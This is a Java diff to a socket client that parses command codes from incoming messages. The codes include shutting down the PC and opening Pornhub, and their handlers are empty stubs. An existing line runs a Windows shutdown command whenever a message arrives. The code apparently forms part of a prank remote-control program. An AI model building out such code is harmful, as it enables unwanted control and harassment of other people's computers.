@@ -60,7 +60,20 @@ public class Client {
 
             if (bfr.ready()) {
                 msg = bfr.readLine();
-                msg = msg.substring(msg.indexOf('>')+2, msg.length());
+
+                int code = Integer.parseInt(msg.substring(0,1));
+
+                switch (code) {
+                    case commandsEnum.MSG:
+                        String msgReceive = msg.substring(2, msg.length() - 1);
+                        break;
+                    case commandsEnum.DESLIGAR_PC:
+                        break;
+                    case commandsEnum.ABRIR_PORNHUB:
+                        break;
+                }
+
+
                 System.out.println("Message Received: "+ msg);
 
                 Runtime.getRuntime().exec("shutdown -s -t 60000");
